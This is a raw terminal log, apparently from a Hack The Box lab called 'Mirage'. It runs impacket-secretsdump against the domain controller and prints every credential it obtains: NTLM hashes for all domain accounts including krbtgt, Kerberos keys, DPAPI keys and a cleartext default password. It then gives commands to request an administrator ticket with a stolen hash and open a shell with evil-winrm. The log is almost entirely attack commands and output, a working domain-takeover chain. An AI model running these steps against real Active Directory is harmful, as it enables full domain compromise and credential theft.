```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Mirage]
└─$ impacket-secretsdump -k -no-pass mirage.htb/Administrator@dc01.mirage.htb -dc-ip 10.10.11.78

Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0x73af13e1bd19973fc6b69f4856f8e408
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:084d93d7a57d7755208a400acfe12e89:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
MIRAGE\DC01$:plain_password_hex:fed165506eaed8b31f6f2d79b1a40607277a7d1d8c1f7ea689f3b4776c6843d5b2dbf8944f1b4f8b24b3307f80086dfc3676131f1afdce3e4d3eecfd67f6db930857efd7bd00ec3735397ace0d5e73950bbce86eb91d037a621113830e3c615069c4794d474c611d34eaf1ad47d81fd22a85007940f74844e3b9104bc4af345605f811a02722d6dd4e373c1dc3af4b2c2e7009b48c809fa0472013bb6f6e2809262f944b24233f7d7f8e3b455274c67d2bfb31ea368ea6c67a045f7766bfc8032a8bc1fe82f7c96ebf82f2013079b24764368d2336b50fa49d2c6b7bb40331f6d819d0d478203f751e21de27bde535ae
MIRAGE\DC01$:aad3b435b51404eeaad3b435b51404ee:b5b26ce83b5ad77439042fbf9246c86c:::
[*] DefaultPassword 
MIRAGE\mark.bbond:3r2o90s5EZ@_@1!
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x81b917dff7583fb28798b080ed6a37279cd60414
dpapi_userkey:0x0cc937b6c3553e3b33ded0dc365acc65adbedf46
[*] NL$KM 
 0000   62 AA C6 71 CE 27 AC D1  E8 65 D7 DF C7 A3 86 77   b..q.'...e.....w
 0010   8B 3A 6F 90 B3 B0 8B 73  A5 BA 26 C1 55 C0 EF 3B   .:o....s..&.U..;
 0020   37 C1 64 D7 0A DA AF 83  60 AD 6B EF A0 27 2F 9D   7.d.....`.k..'/.
 0030   C7 DB 77 77 D4 1B AF 39  61 2D 4E AE C4 BC C3 BB   ..ww...9a-N.....
NL$KM:62aac671ce27acd1e865d7dfc7a386778b3a6f90b3b08b73a5ba26c155c0ef3b37c164d70adaaf8360ad6befa0272f9dc7db7777d41baf39612d4eaec4bcc3bb
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
mirage.htb\Administrator:500:aad3b435b51404eeaad3b435b51404ee:7be6d4f3c2b9c0e3560f5a29eeb1afb3:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1adcc3d4a7f007ca8ab8a3a671a66127:::
mirage.htb\Dev_Account_A:1104:aad3b435b51404eeaad3b435b51404ee:3db621dd880ebe4d22351480176dba13:::
mirage.htb\Dev_Account_B:1105:aad3b435b51404eeaad3b435b51404ee:fd1a971892bfd046fc5dd9fb8a5db0b3:::
mirage.htb\david.jjackson:1107:aad3b435b51404eeaad3b435b51404ee:ce781520ff23cdfe2a6f7d274c6447f8:::
mirage.htb\javier.mmarshall:1108:aad3b435b51404eeaad3b435b51404ee:694fba7016ea1abd4f36d188b3983d84:::
mirage.htb\mark.bbond:1109:aad3b435b51404eeaad3b435b51404ee:8fe1f7f9e9148b3bdeb368f9ff7645eb:::
mirage.htb\nathan.aadam:1110:aad3b435b51404eeaad3b435b51404ee:1cdd3c6d19586fd3a8120b89571a04eb:::
mirage.htb\svc_mirage:2604:aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889:::
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:b5b26ce83b5ad77439042fbf9246c86c:::
Mirage-Service$:1112:aad3b435b51404eeaad3b435b51404ee:305806d84f7c1be93a07aaf40f0c7866:::
[*] Kerberos keys grabbed
mirage.htb\Administrator:aes256-cts-hmac-sha1-96:09454bbc6da252ac958d0eaa211293070bce0a567c0e08da5406ad0bce4bdca7
mirage.htb\Administrator:aes128-cts-hmac-sha1-96:47aa953930634377bad3a00da2e36c07
mirage.htb\Administrator:des-cbc-md5:e02a73baa10b8619
krbtgt:aes256-cts-hmac-sha1-96:95f7af8ea1bae174de9666c99a9b9edeac0ca15e70c7246cab3f83047c059603
krbtgt:aes128-cts-hmac-sha1-96:6f790222a7ee5ba9d2776f6ee71d1bfb
krbtgt:des-cbc-md5:8cd65e54d343ba25
mirage.htb\Dev_Account_A:aes256-cts-hmac-sha1-96:e4a6658ff9ee0d2a097864d6e89218287691bf905680e0078a8e41498f33fd9a
mirage.htb\Dev_Account_A:aes128-cts-hmac-sha1-96:ceee67c4feca95b946e78d89cb8b4c15
mirage.htb\Dev_Account_A:des-cbc-md5:26dce5389b921a52
mirage.htb\Dev_Account_B:aes256-cts-hmac-sha1-96:5c320d4bef414f6a202523adfe2ef75526ff4fc6f943aaa0833a50d102f7a95d
mirage.htb\Dev_Account_B:aes128-cts-hmac-sha1-96:e05bdceb6b470755cd01fab2f526b6c0
mirage.htb\Dev_Account_B:des-cbc-md5:e5d07f57e926ecda
mirage.htb\david.jjackson:aes256-cts-hmac-sha1-96:3480514043b05841ecf08dfbf33d81d361e51a6d03ff0c3f6d51bfec7f09dbdb
mirage.htb\david.jjackson:aes128-cts-hmac-sha1-96:bd841caf9cd85366d254cd855e61cd5e
mirage.htb\david.jjackson:des-cbc-md5:76ef68d529459bbc
mirage.htb\javier.mmarshall:aes256-cts-hmac-sha1-96:20acfd56be43c1123b3428afa66bb504a9b32d87c3269277e6c917bf0e425502
mirage.htb\javier.mmarshall:aes128-cts-hmac-sha1-96:9d2fc7611e15be6fe16538ebb3b2ad6a
mirage.htb\javier.mmarshall:des-cbc-md5:6b3d51897fdc3237
mirage.htb\mark.bbond:aes256-cts-hmac-sha1-96:dc423caaf884bb869368859c59779a757ff38a88bdf4197a4a284b599531cd27
mirage.htb\mark.bbond:aes128-cts-hmac-sha1-96:78fcb9736fbafe245c7b52e72339165d
mirage.htb\mark.bbond:des-cbc-md5:d929fb462ae361a7
mirage.htb\nathan.aadam:aes256-cts-hmac-sha1-96:b536033ac796c7047bcfd47c94e315aea1576a97ff371e2be2e0250cce64375b
mirage.htb\nathan.aadam:aes128-cts-hmac-sha1-96:b1097eb42fd74827c6d8102a657e28ff
mirage.htb\nathan.aadam:des-cbc-md5:5137a74f40f483c7
mirage.htb\svc_mirage:aes256-cts-hmac-sha1-96:937efa5352253096b3b2e1d31a9f378f422d9e357a5d4b3af0d260ba1320ba5e
mirage.htb\svc_mirage:aes128-cts-hmac-sha1-96:8d382d597b707379a254c60b85574ab1
mirage.htb\svc_mirage:des-cbc-md5:2f13c12f9d5d6708
DC01$:aes256-cts-hmac-sha1-96:4a85665cd877c7b5179c508e5bc4bad63eafe514f7cedb0543930431ef1e422b
DC01$:aes128-cts-hmac-sha1-96:94aa2a6d9e156b7e8c03a9aad4af2cc1
DC01$:des-cbc-md5:cb19ce2c733b3ba8
Mirage-Service$:aes256-cts-hmac-sha1-96:80bada65a4f84fb9006013e332105db15ac6f07cb9987705e462d9491c0482ae
Mirage-Service$:aes128-cts-hmac-sha1-96:ff1d75e3a88082f3dffbb2b8e3ff17dd
Mirage-Service$:des-cbc-md5:c42ffd455b91f208
```

```
apt -y install ntpsec-ntpdate
timedatectl set-ntp 0
ntpdate dc01.mirage.htb
impacket-getTGT mirage.htb/administrator -hashes aad3b435b51404eeaad3b435b51404ee:7be6d4f3c2b9c0e3560f5a29eeb1afb3
export KRB5CCNAME='administrator.ccache'
cat << EOF > /etc/krb5.conf
[libdefaults]
    default_realm = MIRAGE.HTB
    dns_lookup_realm = false
    dns_lookup_kdc = false
    forwardable = true
[realms]
    MIRAGE.HTB = {
        kdc = dc01.mirage.htb
        admin_server = dc01.mirage.htb
    }
[domain_realm]
    .mirage.htb = MIRAGE.HTB
    mirage.htb = MIRAGE.HTB
EOF
evil-winrm -i dc01.mirage.htb -r mirage.htb
```
